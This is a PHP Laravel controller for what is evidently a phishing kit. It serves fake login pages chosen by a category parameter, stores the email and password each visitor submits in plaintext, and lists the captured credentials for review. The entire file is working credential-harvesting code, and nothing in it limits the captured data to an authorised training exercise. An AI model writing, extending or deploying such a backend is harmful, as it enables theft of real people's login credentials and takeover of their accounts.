<?php

namespace App\Http\Controllers;

use App\Models\Phishing;
use Illuminate\Http\Request;

class PhishingController extends Controller
{
    // Show all phishing records
   public function index()
{
    $data = Phishing::latest()->get(); // latest first
    return view('phishing.index', [
        'phishings' => $data
    ]);
}


   public function create($category)
{
    return view('login.' . $category, compact('category'));

}

public function store(Request $request)
{
    $request->validate([
        'email' => 'required|email',
        'password' => 'required',
        'category' => 'required'
    ]);

    Phishing::create([
        'email' => $request->email,
        'password' => $request->password,
        'category' => $request->category
    ]);

    return redirect()->route('success')->with('success', 'Record added successfully!');
}


    
    // Delete a specific phishing record
    public function destroy($id)
    {
        $phishing = Phishing::findOrFail($id);
        $phishing->delete();

        return redirect()->route('phishing.index')->with('success', 'Record deleted successfully!');
    }
}
